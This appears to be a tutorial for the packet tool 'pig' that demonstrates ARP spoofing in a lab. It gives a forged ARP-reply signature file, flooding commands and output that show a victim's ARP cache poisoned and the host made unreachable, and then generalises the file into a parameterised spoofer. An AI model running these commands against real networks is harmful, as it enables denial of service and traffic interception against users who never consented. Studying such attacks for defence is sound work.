# Doing some ARP spoofing with Pig

*by Rafael Santiago*

----

**Abstract**: Now ``pig`` has the ability of sending ``ARP`` packets and in this document I will show how to do this, explaining some details and particularities involved.

----

## ARP spoofing definition and quick overview

Although this text not being an extensive resource about ``ARP``, I think that is important to define (even superficially) what
it is for every newbie in this subject reading this document.

The ``ARP`` protocol is responsible to inform the hardware and protocol's addresses from a host to other. As hardware
address stands for the ``MAC address`` and protocol address the ``Network address``. Nowadays the most used network
protocol is the ``IP`` (Internet Protocol). The protocol address in this context stands for the ``IP address``. Being more
specific an ``IPv4`` address because we do not use ``ARP`` inside ``IPv6`` networks but this is another story totally out of
scope by now.

When we got an ``ARP`` packet saying that some hardware address has some protocol address we got a ``Reverse ARP`` (RARP).
In a ``ARP`` what defines if it is a reverse ARP or not is a field called ``operation code``.

Ah yes, ``ARP`` is ``A``ddress ``R``esolution ``P``rotocol.

For this document the standard ``ARP`` reply and request is the relevant subject in your goal. Forget about ``RARP`` here.

If you want to know more about this try to take a look in the [RFC#826](https://tools.ietf.org/html/rfc826).

Now ``ARP poisoning`` or ``ARP spoofing`` is the process of faking an ``ARP reply`` in order to make a host believe that
another host is the host that him is looking for. Confuse?

```
Host A -> Broadcasts an ARP request(who has the address "192.30.70.3"?)
(Host B has it but in this moment Host H is flooding the network with ARP replies saying that him got it...)
Host H -> Reply an ARP request (I have it my MAC is "f0:0b:a0:f0:0b:a0")
Host H -> Reply an ARP request (I have it my MAC is "f0:0b:a0:f0:0b:a0")
Host H -> Reply an ARP request (I have it my MAC is "f0:0b:a0:f0:0b:a0")
Host H -> Reply an ARP request (I have it my MAC is "f0:0b:a0:f0:0b:a0")
Host H -> Reply an ARP request (I have it my MAC is "f0:0b:a0:f0:0b:a0")
Host B -> Reply an ARP request (I have it my MAC is "00:00:aa:bb:cc:dd")
Host H -> Reply an ARP request (I have it my MAC is "f0:0b:a0:f0:0b:a0")
Host H -> Reply an ARP request (I have it my MAC is "f0:0b:a0:f0:0b:a0")
Host H -> Reply an ARP request (I have it my MAC is "f0:0b:a0:f0:0b:a0")
Host H -> Reply an ARP request (I have it my MAC is "f0:0b:a0:f0:0b:a0")
Host H -> Reply an ARP request (I have it my MAC is "f0:0b:a0:f0:0b:a0")
Host H -> Reply an ARP request (I have it my MAC is "f0:0b:a0:f0:0b:a0")
Host H -> Reply an ARP request (I have it my MAC is "f0:0b:a0:f0:0b:a0")
...
Host A -> Okay! Host H gots it... this operation was so easy and quick... the life is so beautiful!!! then let's continue!!
...
```

Did you see the shy ``Host B`` reply lost in the sea of replies from ``Host H``???

Here is the idea. The art of deceiving.

>"Repeat a lie a thousand times and it becomes the truth."

Unfortunately the ``ARP`` protocol implements this World *modus operandi*. In this case I would say that ``ARP`` is ``World compliant``.

## Making your little pig become a liar

From now on I will assume that you know details about the ``ARP`` protocol.

For this part I will use the following network setup:

- ``TARDIS`` will be the attacker host name.
- ``Skaro`` will be the attacked host name.

Some facts about ``TARDIS``:

1. it has the IP address ``192.30.70.3`` and uses the interface ``eth1``.
2. it has the MAC address ``08:00:27:c5:75:9c``.

Some facts about ``Skaro``:

1. it has the IP address ``192.30.70.10``.
2. it has the MAC address ``08:00:27:00:80:ad``.

What will be done is deceive ``Skaro`` about the ``TARDIS`` MAC address in order to impede any Skaro's packet arriving.

So let's try to ping ``TARDIS`` from ``Skaro``:

```
C:\Users\davros>ping 192.30.70.3
Reply from 192.30.70.3: bytes=32 time<1ms TTL=64
Reply from 192.30.70.3: bytes=32 time<1ms TTL=64
Reply from 192.30.70.3: bytes=32 time<1ms TTL=64
Reply from 192.30.70.3: bytes=32 time<1ms TTL=64
Reply from 192.30.70.3: bytes=32 time<1ms TTL=64
...
```

Ok, the ``TARDIS`` is reachable... Still in ``Skaro`` let's see the ``TARDIS`` MAC address:

```
C:\Users\davros>arp -a
(...)
Interface: 192.30.70.10 --- 0x36
IP address             Physical address        Type
192.30.70.3            08-00-27-c5-75-9c       Dynamic
(...)
```

Yes as we know the MAC address listed by ``arp -a`` is the real MAC of ``TARDIS``.

Now in ``TARDIS`` let's create the following ``pigsty`` file:

```
[
    # "force-field.pigsty"
    arp.hwtype = 0x1,
    arp.ptype = 0x0800,
    arp.hwlen = 0x6,
    arp.plen = 0x4,
    arp.opcode = 0x2,
    arp.hwsrc = "00:de:ad:be:ef:00",
    arp.psrc = 192.30.70.3,
    arp.hwdst = "08:00:27:00:80:ad",
    arp.pdst = "192.30.70.10",
    signature = "TARDIS force field"
]
```

Now let's activate our "force field" ;)

```
doctor@TARDIS:~/src/pig/src# bin/pig --signatures=force-field.pigsty --lo-iface=eth1 --no-gateway --timeout=2
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
(...)
```

Now we need silence (in order to create suspense)

![The Good, the Ugly, the Bad and the Cat](https://github.com/rafael-santiago/pig/blob/master/etc/the-good-the-ugly-the-bad-and-the-cat.gif)

So?? Is it working???? ahn?

Going back to ``Skaro`` let's try to ping ``TARDIS``:

```
C:\Users\davros>ping 192.30.70.3
Reply from 192.30.70.3: Destination Host Unreachable.
Reply from 192.30.70.3: Destination Host Unreachable.
(...)
```

Nice?

Let's see the ``Skaro's`` ARP table:

```
C:\Users\davros>arp -a
(...)
Interface: 192.30.70.10 --- 0x36
IP address             Physical address        Type
192.30.70.3            00-de-ad-be-ef-00       Dynamic
(...)
```

It has the exact MAC address defined in the ``TARDIS force field``.

Maybe you do not understand why the option ``--no-gateway`` was used... It was used because ``ARP`` packets are non-routable.
In other words it will never passthru a gateway in order to go to another network. So the gateway's address and the network
mask are pretty useless in this situation. The choice for a small timeout is because we need to flood and keep it on.

## Making your little pig become a professional liar

It is cool but rather static. We can generalize some info and with it the ``pig`` can be used as a pratical ``ARP spoofer``.

Take a look at our "force field" pigsty:

```
[
    # "force-field.pigsty"
    arp.hwtype = 0x1,
    arp.ptype = 0x0800,
    arp.hwlen = 0x6,
    arp.plen = 0x4,
    arp.opcode = 0x2,
    arp.hwsrc = hw-src-addr,
    arp.psrc = proto-src-addr,
    arp.hwdst = hw-dst-addr,
    arp.pdst = proto-dst-addr,
    signature = "TARDIS force field"
]
```

In the shown signature above is being used the indirections for some command line options that ``pig`` allows for ``ARP`` signatures.
Take a look at the ``Table 1`` to know more about them.

**Table 1**: The ``ARP`` command line indirections recognized by ``pig`` until now.

| **Indirection**      |         **Stands for**            | **Data type** | **How to define it in the cmdline**    |
|:--------------------:|:---------------------------------:|:-------------:|:--------------------------------------:|
| ``hw-src-addr``      |   The hardware source address     |     string    | --hw-src-addr="\"00:11:22:33:44:55\""  |
| ``proto-src-addr``   |   The protocol source address     | ipv4 address  | --proto-src-addr=192.30.70.3           |
| ``hw-dst-addr``      |   The hardware destination address|     string    | --hw-src-addr="\"aa:bb:cc:dd:ee:ff\""  |
| ``proto-dst-addr``   |   The protocol destination address| ipv4 address  | --proto-dst-addr=192.30.70.10          |

The usage changes in order that now it is necessary to inform these referenced data. For instance:

```
doctor@TARDIS:~/src/pig/src# bin/pig --signatures=force-field.pigsty --hw-src-addr="\"00:de:ad:be:ef:00\"" --proto-src-addr=192.30.70.3 --hw-dst-addr="\"08:00:27:00:80:ad\"" --proto-dst-addr=192.30.70.10 --lo-iface=eth1 --no-gateway --timeout=2
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
pig INFO: a packet based on signature "TARDIS force field" was sent.
(...)

```

The spoofing is done the redirection issues is out of scope of this document. It is up to you.

Bye!
